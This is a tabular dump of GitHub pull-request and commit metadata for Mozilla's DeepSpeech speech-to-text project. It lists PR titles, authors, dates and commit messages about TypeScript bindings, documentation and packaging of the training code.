1110,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf31b2e351b107fcbaafb0a05cdea7ebe515c190,Expose Stream-related within Stream class
1111,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3581bdf9fec8edb53e38b4e41fc35a049cc857b8,Add TypeScript CI
1112,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5723dba1804b512f892c5117fe57526d71edead0,Update doc for TypeScript support
1113,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88ac227ebee8e8fdde93769ca5dab96076be9204,Fix decoder doc not generated
1114,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2881,2881,Add letter by letter probabilities to metadata,,utunga,166867,2020-04-02T10:38:04Z,NONE,False,29,11,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5d8e3759c10e8dd537b1519aabf46dfd59e9895,add confidences to metadata on a letter by letter basis
1115,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2881,2881,Add letter by letter probabilities to metadata,,utunga,166867,2020-04-02T10:38:04Z,NONE,False,29,11,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69c80dd5228f6fafa6d100ef466f1a7a1fbce421,merge upstream changes
1116,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2880,2880,Corrected Typo in Dockerfile,,NormanTUD,34073778,2020-04-02T08:18:46Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b88b63399a1aba0de04cbd84b151c9c6fe25a60a,Corrected Typo in Dockerfile
1117,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2879,2879,batch transcribe dir (recursively) with transcribe.py,,JRMeyer,8389864,2020-04-02T03:42:26Z,CONTRIBUTOR,True,55,34,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa223d709072709dd73bd97b03c0701dafcb3e10,batch transcribe dir (recursively) with transcribe.py
1118,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2879,2879,batch transcribe dir (recursively) with transcribe.py,,JRMeyer,8389864,2020-04-02T03:42:26Z,CONTRIBUTOR,True,55,34,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cad03d33ea875afc90a808667a30e44ba3819507,simplify function
1119,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53cd492fbad850f3b245c38b968f5a803e497958,adding transfer-learing to docs
1120,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa223d709072709dd73bd97b03c0701dafcb3e10,batch transcribe dir (recursively) with transcribe.py
1121,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b88b63399a1aba0de04cbd84b151c9c6fe25a60a,Corrected Typo in Dockerfile
1122,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0cee75c295be6dbac5456d56fdaca3e3e8809d29,"Merge pull request #2880 from NormanTUD/master

Corrected Typo in Dockerfile"
1123,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dfbcdf7ed2ae8fb4f41698dd3a57fec3beece370,adding transfer-learing to docs
1124,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3341ac3105ada2246a75cd5d70fd8dc38a57a64a,expanding on drop_source_layers and more elaboration
1125,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,934e58d100b4301443070d1ba5aedc2fa88ccf72,Merge branch 'transfer-learning-docs' of github.com:JRMeyer/DeepSpeech into transfer-learning-docs
1126,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cad03d33ea875afc90a808667a30e44ba3819507,simplify function
1127,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,510e29fe6587cdaaf930363f721637358bc26999,"Merge pull request #2879 from JRMeyer/batch-transcribe

batch transcribe dir (recursively) with transcribe.py"
1128,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a80514555f150efd5e05a2a1f2a6047d650fa5b,adding transfer-learing to docs
1129,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6d752fe8ad3558d9651d353837008d35820ec8e,expanding on drop_source_layers and more elaboration
1130,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3399bd7fbaa01c102e90408bbdb81f497f62cbef,more UTF-8 caveats
1131,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a86da2ea22e9dfe67525b797ecbe2684f29644a3,expanding on drop_source_layers and more elaboration
1132,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2878,2878,Transfer-learning docs,,JRMeyer,8389864,2020-04-02T01:20:44Z,CONTRIBUTOR,False,91,37,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adfd9bb5b146139f6f52436cd22ca1c08748b829,Merge branch 'transfer-learning-docs' of github.com:JRMeyer/DeepSpeech into transfer-learning-docs
1133,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2877,2877,Fix .compute for packaged training code,,reuben,477142,2020-04-01T14:26:19Z,MEMBER,True,2,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dab19ebe56349ae4609098d4cbea2d24f9ee734,Fix .compute for packaged training code
1134,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2876,2876,Add type declaration file for v0.7.0,"Add a type declaration file for the latest DeepSpeech version.
Update documentation on how to generate and `index.d.ts`.

Closes #2841

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>",piraka9011,16828657,2020-04-01T13:59:12Z,CONTRIBUTOR,False,244,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b990063af96637bba4c439ec227eced83ad846b,"Add type declaration file for v0.7.0

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1135,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2876,2876,Add type declaration file for v0.7.0,"Add a type declaration file for the latest DeepSpeech version.
Update documentation on how to generate and `index.d.ts`.

Closes #2841

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>",piraka9011,16828657,2020-04-01T13:59:12Z,CONTRIBUTOR,False,244,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20a043d6371ff03dc62fce3680b4b964e3d79a5a,"Update README

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1136,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2872,2872,Add TS Bindings,Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>,lissyx,1645737,2020-03-31T16:06:32Z,COLLABORATOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,806e285fca0b43574909ca74b88023d23f7cad98,"Add TS Bindings

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1137,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2872,2872,Add TS Bindings,Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>,lissyx,1645737,2020-03-31T16:06:32Z,COLLABORATOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5326881ab77bce4a519e36d2bfe5f1695c674c18,Make sure to call dts-gen from proper place
1138,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2871,2871,Automatically install ds_ctcdecoder in setup.py,,reuben,477142,2020-03-31T15:56:16Z,MEMBER,True,86,95,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c428acf478bc2e0ea18da69e02554e095f8654b5,Automatically install ds_ctcdecoder in setup.py
1139,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2871,2871,Automatically install ds_ctcdecoder in setup.py,,reuben,477142,2020-03-31T15:56:16Z,MEMBER,True,86,95,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af7e2c294dd28c5811e76780cd1e9d1f198b4d36,"Pin versions of pip, setuptools, wheel in training readme

X-DeepSpeech: NOBUILD"
1140,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2870,2870,Add TS Bindings,Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>,piraka9011,16828657,2020-03-31T14:33:49Z,CONTRIBUTOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,806e285fca0b43574909ca74b88023d23f7cad98,"Add TS Bindings

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1141,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2870,2870,Add TS Bindings,Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>,piraka9011,16828657,2020-03-31T14:33:49Z,CONTRIBUTOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e0b80fce35aa4f6bf33c175a3ec9e214a9d02d4,"Use npx run for dts-gen

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1142,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2869,2869,"Add some early checks, for Scorer at first",Fixes #2807,lissyx,1645737,2020-03-31T13:12:46Z,COLLABORATOR,True,9,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,950d097ca10d639603fc3d6166c73e23afc93931,"Add some early checks, for Scorer at first

Fixes #2807"
1143,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2868,2868,Mention validate_label_locale in training doc,Fixes #2865,lissyx,1645737,2020-03-31T12:16:09Z,COLLABORATOR,True,12,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a11a8293e3cccc696b9bcc2b7e395d1a8010eae,"Mention validate_label_locale in training doc

Fixes #2865"
1144,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2864,2864,Fixed sample rate logic in Python client,,lissyx,1645737,2020-03-30T20:35:04Z,COLLABORATOR,True,5,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fd39175b33531893caa65ef393923d6a27a96ff,Fixed sample rate logic in Python client
1145,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2863,2863,Error early in generate_package.py if no alphabet was specified and not using UTF-8 mode,https://discourse.mozilla.org/t/segmentation-fault-ctc-beam-search-decoder-batch-on-mac/56090/13,reuben,477142,2020-03-30T16:19:10Z,MEMBER,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09673581a492ac9ed027eefee58af9e9ebd17000,"Error early in generate_package.py if no alphabet was specified and not using UTF-8 mode

X-DeepSpeech: NOBUILD"
1146,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2862,2862,add confidences to metadata on a letter by letter basis,,utunga,166867,2020-03-30T10:09:16Z,NONE,False,26,10,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b2ffc32667209513644bcacf92e0a1d59d6fe6c,add confidences to metadata on a letter by letter basis
1147,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2859,2859,Updated .compute,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2020-03-27T15:31:58Z,CONTRIBUTOR,True,14,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c4a2050b8a097940d794a9b5e7ca17ec097f9fc,Updated .compute
1148,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a05baa35c96a698d5b7836a4351968bf6dda2734,Package training code to avoid sys.path hacks
1149,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20b0ab17eaf91801fadde1dadebbc5d275aa1d15,Remove unused GPU usage tools
1150,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7e6b8c3e6fe34650543e683b416c6cbea8eb1bb,Sort importer imports with isort
1151,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f0bf3b3a89d3feec365f2f2697ac14ada2cb6d3,Reformat importers with black
1152,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f68ed1001237f1b206fd447e3a966a60db21a01,Remove unneeded future imports from importers
1153,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c738d550122983df0d69dfba0b6b67a641244706,Remove unneeded six.moves import
1154,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc119880b9583ec8e20d062be893c9a920bbf73d,Sync training package version with main version
1155,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2856,2856,Package training code to avoid sys.path hacks,"This makes it so that the training code is actually installable, and avoids the need for `sys.path` hacks to import things. Now we have proper relative imports. For development, one should do `pip install -e .` in the root folder. This will install the training code in editable mode, meaning you can make changes to the code and they'll be reflected instantly (it's just a symbolic link).

The biggest catch here is assumptions about paths and `cwd`. Code should use file-relative paths instead of assuming what the `cwd` is. For paths that are received directly from the user nothing needs to be done as they are already relative to `cwd`.

I've removed the `sys.path` hacks from the importers and fixed any importing inconsistencies. I've also left compatibility scripts in `DeepSpeech.py`, `evaluate.py` and `util/taskcluster.py`, since we've been advertising these for a while. We can also deprecate them in favor of more robust solutions, such as adding entry points in the setup script which add PATH-visible commands, or simply telling users to use e.g. `python -m deepspeech_training.train` instead of `python DeepSpeech.py`.

I've also included some small linter fixes since it was throwing a bunch of problems, and fixed `stats.py` which was broken by the SDB PR. Sorry for not breaking it all in commits, I was working quickly and by the time things fell into place it was too late, specially with all the `git mv`s.",reuben,477142,2020-03-25T16:11:55Z,MEMBER,True,3272,2695,78,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02fa9c781cef092a749e886f9af7ba1bf41ef68d,Fix Python 3.5 compat issue
1156,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2853,2853,Bump VERSION to 0.7.0-alpha.3,,lissyx,1645737,2020-03-25T12:04:35Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60150bd0bdcde36af38fa1a97c970db3521632b3,Bump VERSION to 0.7.0-alpha.3
1157,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2851,2851,Add back dataset size limitation,Fixes #2777,lissyx,1645737,2020-03-24T17:58:20Z,COLLABORATOR,False,69,7,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4fb562df6209949a90f62328730f4357ef66e51,"Add back dataset size limitation

Fixes #2777"
1158,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2850,2850,Add a little more documentation around the decoder and UTF-8 mode,,reuben,477142,2020-03-24T13:52:27Z,MEMBER,True,86,2,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b3322821b42b0eaf70b16a3cd9d270967e50478,Add decoder and UTF-8 docs
1159,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2850,2850,Add a little more documentation around the decoder and UTF-8 mode,,reuben,477142,2020-03-24T13:52:27Z,MEMBER,True,86,2,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e72f013f7fae81f3800e40bc40c4879ea8f19be5,Address review comments
1160,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2849,2849,Fix #2830 - Support for unlabeled samples,Plus a bit of documentation alignment and extension following the NumPy docstring style.,tilmankamp,5991088,2020-03-24T12:25:14Z,CONTRIBUTOR,True,192,65,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41da7b287014f259e7c526471692bf25af70c9e0,Fix #2830 - Support for unlabeled samples
